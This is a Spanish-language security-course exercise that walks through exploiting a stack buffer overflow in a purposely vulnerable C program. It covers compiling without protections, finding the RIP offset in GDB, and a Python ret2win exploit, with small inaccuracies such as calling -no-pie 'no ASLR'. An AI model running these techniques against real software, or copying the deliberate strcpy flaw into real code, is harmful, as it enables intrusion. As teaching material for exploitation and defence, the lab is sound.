# Ejercicio 04: Buffer Overflow - Crear Exploit Funcional

## Objetivos de Aprendizaje

- Explotar un buffer overflow real
- Controlcar el RIP (instruction pointer)
- Llamar a funciones arbitrarias
- Entender qué hace posible un exploit

## Tiempo Estimado

75-90 minutos

## Dificultad

⭐⭐⭐ Intermedio-Avanzado

---

## Parte 1: Crear Objetivo Vulnerable

### Programa Target

```bash
cat > objetivo.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Función que NO queremos que se ejecute normalmente
void funcion_privilegiada() {
    printf("¡¡¡ HAS GANADO !!!\n");
    printf("Función privilegiada ejecutada\n");
    exit(0);
}

// Función vulnerable
void procesar_entrada(char *entrada) {
    char buffer[16];
    printf("[*] Procesando entrada...\n");
    printf("[*] Dirección de buffer: %p\n", (void *)&buffer);
    printf("[*] Dirección de funcion_privilegiada: %p\n", (void *)funcion_privilegiada);
    
    strcpy(buffer, entrada);  // VULNERABLE
    
    printf("[*] Buffer contiene: %s\n", buffer);
    printf("[*] Entrada fue: %s\n", entrada);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Uso: %s <entrada>\n", argv[0]);
        return 1;
    }
    
    procesar_entrada(argv[1]);
    printf("Función retornó normalmente\n");
    
    return 0;
}
EOF
```

### Compilar SIN protecciones

```bash
gcc -g -O0 \
    -fno-stack-protector \
    -z execstack \
    -no-pie \
    -o objetivo objetivo.c
```

**Flags explicados:**
- `-g`: Debug symbols (para GDB)
- `-O0`: Sin optimizar
- `-fno-stack-protector`: Desactivar canaries
- `-z execstack`: Stack ejecutable (para shellcode)
- `-no-pie`: Sin ASLR (direcciones fijas)

### Verificar protecciones

```bash
checksec ./objetivo

# Esperado:
# Full RELRO: No
# Partial RELRO: No
# Stack Canary: Disabled
# NX: Disabled
# PIE: No
# RPATH: No
# RUNPATH: No
# Symbols: Yes
```

---

## Parte 2: Reconocimiento

### Ejecutar programa normal

```bash
./objetivo "hola"

# Output:
# [*] Procesando entrada...
# [*] Dirección de buffer: 0x7ffffffde4c0
# [*] Dirección de funcion_privilegiada: 0x400556
# Función retornó normalmente
```

**Información crítica:**
- Buffer está en `0x7ffffffde4c0`
- `funcion_privilegiada` está en `0x400556`

### Probar con input largo

```bash
./objetivo "AAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# Posible output:
# Segmentation fault (core dumped)
# O el programa se comporta extraño
```

El programa crashed porque RIP se corrompió.

---

## Parte 3: Encontrar el Offset

Necesitamos saber exactamente **cuántos bytes** escribir para llegar a RIP.

### Crear patrón único

```bash
# Patrón de longitud creciente
python3 << 'EOF'
# Crear patrón para identificar offset
pattern = ""
for i in range(0, 10):
    pattern += chr(65 + i) * 10  # AAAAAAAAAA BBBBBBBBBB CCCC...

print(pattern)
EOF

# Output: AAAAAAAAAABBBBBBBBBBCCCCCCCCCC...
```

Mejor: usar **pwntools** (si tienes):

```bash
pip3 install pwntools
python3 << 'EOF'
from pwn import cyclic
pattern = cyclic(50)
print(pattern)  # Patrón que nos ayuda a encontrar offset
EOF
```

O generar manualmente:

```bash
python3 << 'EOF'
# Crear patrón sencillo
entrada = "A" * 10
entrada += "B" * 10
entrada += "C" * 10
entrada += "D" * 10
entrada += "E" * 10
print(entrada)
EOF
```

### Usar GDB para encontrar offset

```bash
gdb ./objetivo

(gdb) run "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII"
# Crashea con RIP corrupto

(gdb) backtrace
#0  0x4444444444444444 in ?? ()
# Encontró 0x44444444 = "DDDD"
# Eso significa los "D"s corresponden a RIP

# Contar: AAAA(4) BBBB(4) CCCC(4) DDDD(4) = 16 primeros
# Buffer es 16 bytes, así que offset a RIP = 16 + 8 (saved rbp) = 24
```

### Método más preciso

```bash
python3 << 'EOF'
# Crear entrada con offset claro
buffer_size = 16
saved_rbp = 8
offset_to_rip = buffer_size + saved_rbp

# Llenar con patrón
entrada = b"A" * offset_to_rip
entrada += b"RRRRRRRR"  # RIP debe ser estos 8 bytes

print(entrada.hex())  # Ver qué enviar
EOF
```

---

## Parte 4: Construir el Exploit

### Paso 1: Generar payload básico

```bash
python3 << 'EOF'
from struct import pack

# Información del programa
funcion_privilegiada_addr = 0x400556
buffer_size = 16
saved_rbp = 8
offset = buffer_size + saved_rbp

# Construir payload
payload = b"A" * offset  # Llenar buffer y saved rbp
payload += pack("<Q", funcion_privilegiada_addr)  # RIP

# Mostrar payload
print("Payload (hex):", payload.hex())
print("Payload (len):", len(payload))

# Guardar a archivo
with open("payload.bin", "wb") as f:
    f.write(payload)
EOF
```

### Paso 2: Ejecutar exploit

```bash
# Método 1: Pasar como argumento
python3 -c "
from struct import pack
payload = b'A' * 24 + pack('<Q', 0x400556)
import sys
sys.stdout.buffer.write(payload)
" | xargs -0 ./objetivo

# Método 2: Script Python (más limpio)
cat > exploit.py << 'EXPLOIT'
#!/usr/bin/env python3
from struct import pack
import subprocess

funcion_privilegiada = 0x400556
offset = 24

payload = b"A" * offset
payload += pack("<Q", funcion_privilegiada)

print("[*] Payload:", payload)
print("[*] Longitud:", len(payload))

# Ejecutar
resultado = subprocess.run(["./objetivo", payload], capture_output=True)
print("[*] Output:")
print(resultado.stdout.decode())
if resultado.stderr:
    print("[!] Stderr:")
    print(resultado.stderr.decode())

EXPLOIT

chmod +x exploit.py
python3 exploit.py
```

### Output esperado

```
[*] Procesando entrada...
[*] Dirección de buffer: 0x7ffffffde4c0
[*] Dirección de funcion_privilegiada: 0x400556
¡¡¡ HAS GANADO !!!
Función privilegiada ejecutada
```

---

## Parte 5: Verificar con GDB

### Confirmar que RIP fue controlado

```bash
gdb ./objetivo

(gdb) break procesar_entrada
(gdb) run $(python3 -c "
from struct import pack
print('A'*24 + pack('<Q', 0x400556).decode('latin1'))")

(gdb) continue
# Debería ejecutar funcion_privilegiada sin crash
```

### Inspeccionar stack antes del retorno

```bash
(gdb) break procesar_entrada
(gdb) run $(python3 exploit.py 2>/dev/null | grep "Payload" | cut -d: -f2)

# En el breakpoint:
(gdb) x/50x &buffer
# Verás los "A"s seguidos de 0x400556

(gdb) print &buffer
$1 = 0x7ffffffde4c0

(gdb) x/30x 0x7ffffffde4c0
# Deberías ver:
# 0x7ffffffde4c0: 0x41 0x41 ... (AAAA...)
# 0x7ffffffde4d8: 0x56 0x05 0x40 0x00 ... (dirección de función)
```

---

## Parte 6: Entender Qué Sucedió

### El Ataque Paso a Paso

```
1. Llamar función normal:
   ./objetivo "hola"
   
2. Objetivo llama procesar_entrada("hola")
   Stack:
   [...] [saved_rbp] [saved_rip=main+XX] [buffer de 16 bytes]
   
3. strcpy copia "hola" a buffer
   No pasa nada, "hola" cabe en 16 bytes
   
4. procesar_entrada retorna
   pop rbp -> restaura old rbp
   ret -> usa saved_rip para saltar a main
   Funciona normal
   
=== AHORA CON EXPLOIT ===

1. Llamar función con payload:
   ./objetivo "AAAA...A[addr_funcion]"
   
2. strcpy copia TODO el payload
   AAAAAAA... sobrescribe buffer
   [addr_funcion] sobrescribe saved_rip
   
3. procesar_entrada retorna
   pop rbp -> restaura old rbp (corrupto pero OK)
   ret -> usa [saved_rip] = 0x400556
   SALTA A funcion_privilegiada
   
4. funcion_privilegiada ejecuta
   printf("¡¡¡ HAS GANADO !!!\n")
   exit(0)
```

### Por Qué Funciona

```
✓ Sin protecciones de stack (--fno-stack-protector)
✓ RIP está en sitio predecible (offset fijo)
✓ Dirección de función es conocida (-no-pie)
✓ Podemos escribir la dirección exacta
✓ CPU ejecuta lo que RIP le dice
```

---

## Parte 7: Variaciones del Exploit

### Variación 1: Cambiar función ejecutada

```python
# En lugar de funcion_privilegiada, llamar a otra
# Ejemplo: Cambiar para llamar a printf

# Necesita argumentos, más complejo (ver siguiente ejercicio)
```

### Variación 2: Byteorder (Little Endian vs Big Endian)

```python
# x86-64 es Little Endian
# 0x400556 se almacena como: 56 05 40 00 ...

from struct import pack
addr = 0x400556
le = pack("<Q", addr)  # Little endian (correcto para x86-64)
be = pack(">Q", addr)  # Big endian (incorrecto aquí)

print("LE:", le.hex())  # 5605400000000000
print("BE:", be.hex())  # 0000000000400556
```

### Variación 3: Payload con NOP sled

```python
# Técnica para aumentar probabilidad de golpear objetivo
# (Importante cuando hay ASLR, NO necesario aquí)

NOP = b"\x90"
payload = NOP * 100  # Llenar con NOPs
payload += b"A" * (offset - 100)
payload += pack("<Q", funcion_privilegiada)
```

---

## Checkpoints

✅ Completaste cuando:

- [ ] Compilaste objetivo.c sin protecciones
- [ ] Ejecutaste programa normal (sin crash)
- [ ] Ejecutaste programa con input largo (crash)
- [ ] Encontraste offset a RIP (24 bytes)
- [ ] Creaste exploit.py que carga dirección correcta
- [ ] Ejecutaste exploit y viste "¡¡¡ HAS GANADO !!!"
- [ ] Verificaste en GDB que RIP fue sobrescrito
- [ ] Entendiste cada paso del ataque

---

## Desafío Extra

### Nivel 1: Exploit Automático

```bash
# Crear script que automáticamente encuentre offset
python3 << 'EOF'
import subprocess
import struct

# Binary search para encontrar offset
for offset in range(16, 32):
    payload = b"A" * offset + b"DEADBEEF"
    try:
        result = subprocess.run(["./objetivo", payload], 
                              timeout=1, 
                              capture_output=True)
        if b"Segmentation" in result.stderr or "DEAD" in str(result.returncode):
            print(f"Offset encontrado alrededor de: {offset}")
            break
    except:
        pass
EOF
```

### Nivel 2: Ejecutar Shellcode

(Avanzado - requiere conocimiento de assembly)

```bash
# Generar shellcode que ejecute /bin/sh
# (Tema para ejercicio 05)
```

### Nivel 3: Exploit con ASLR Activado

(Muy avanzado)

```bash
# Compilar con PIE (ASLR)
gcc -pie -fPIC -o objetivo_aslr objetivo.c

# Ahora necesitarás:
# - Information leak (format strings)
# - O ROP gadgets
# - O Guess direcciones (probabilístico)
```

---

## Conceptos Clave Aprendidos

### Explotación de Buffer Overflow
- Overflow para controlar RIP
- Estructura del stack
- Offset a RIP es determinístico
- Código ejecutable sin límites

### Preparación del Binario
- Compilar sin protecciones (para laboratorio)
- Direcciones fijas (-no-pie)
- Stack ejecutable (-z execstack)

### Construcción de Payload
- Llenar buffer
- Llenar saved rbp
- Sobrescribir RIP con dirección objetivo

---

## Conceptos Relacionados (Próximos)

- **ROP Chains**: Cuando código no es ejecutable
- **Format Strings**: Para leaks de información
- **ASLR Bypass**: Cuando direcciones cambian

---

## Lecturas Relacionadas

- `recursos/gdb-guia.md` - Debugging de exploits
- `recursos/hints-futuros.md` - ROP chains
- `01-teoria/leccion_01.md` - Buffer overflow basics

## Siguiente

**Ejercicio 05:** Format String Vulnerabilities
